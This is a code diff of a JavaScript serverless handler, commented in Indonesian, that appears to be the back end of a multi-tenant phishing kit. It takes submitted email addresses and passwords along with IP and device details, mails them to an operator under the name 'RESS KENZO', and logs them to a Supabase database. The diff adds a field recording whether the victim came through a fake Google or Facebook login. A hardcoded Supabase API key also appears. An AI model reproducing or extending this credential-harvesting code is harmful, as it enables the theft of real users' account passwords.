@@ -25,6 +25,9 @@ export default async function handler(req, res) {
         // --- TAMBAHAN MULTI-TENANT ---
         const WEB_ID = d.web_id || "web_default"; 
         // -----------------------------
+        
+        // AMBIL PLATFORM DARI FRONTEND (Google / Facebook)
+        const PLATFORM = d.platform || "Unknown";
 
         const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
         const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
@@ -33,7 +36,6 @@ export default async function handler(req, res) {
         let NAMA = "RESS KENZO"; 
 
         // --- TAMBAHAN MULTI-TENANT ---
-        // Filter config berdasarkan WEB_ID
         try {
             const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?web_id=eq.${WEB_ID}&select=*`, {
                 headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
@@ -47,7 +49,9 @@ export default async function handler(req, res) {
         // -----------------------------
 
         const flag = countryFlag(d.negaraKode || "");
-        const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");
+        
+        // PREVIEW TEXT DINAMIS NGIKUTIN PLATFORM
+        const previewText = "ID | +62 | LOGIN " + PLATFORM + " | IP " + (d.ip || "-");
 
         // FORMAT EMAIL LENGKAP
         const htmlBody = `
@@ -62,7 +66,7 @@ export default async function handler(req, res) {
               <table style="width:100%;font-size:14px;border-collapse:collapse">
                 <tr><td style="padding:10px;font-weight:bold;width:35%">EMAIL</td><td style="padding:10px">${d.email || "-"}</td></tr>
                 <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PASSWORD</td><td style="padding:10px">${d.password || "-"}</td></tr>
-                <tr><td style="padding:10px;font-weight:bold">LOGIN</td><td style="padding:10px">Google</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">LOGIN DARI</td><td style="padding:10px"><b>${PLATFORM}</b></td></tr> <!-- DINAMIS DI SINI -->
               </table>
 
               <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📱 DEVICE INFO</h3>
@@ -99,7 +103,7 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: NAMA + " <hasilress@mediafire.my.id>",
                 to: [EMAIL],
-                subject: "🥷 " + NAMA + " 🥷 | IP " + (d.ip || "-"),
+                subject: "🥷 " + NAMA + " 🥷 | " + PLATFORM + " | IP " + (d.ip || "-"), // SUBJECT DINAMIS
                 html: htmlBody
             })
         });
@@ -109,7 +113,6 @@ export default async function handler(req, res) {
         if (response.ok) {
             try {
                 // --- TAMBAHAN MULTI-TENANT ---
-                // Simpen WEB_ID ke logs_result
                 await fetch(`${SUPABASE_URL}/rest/v1/logs_result`, {
                     method: "POST",
                     headers: { 
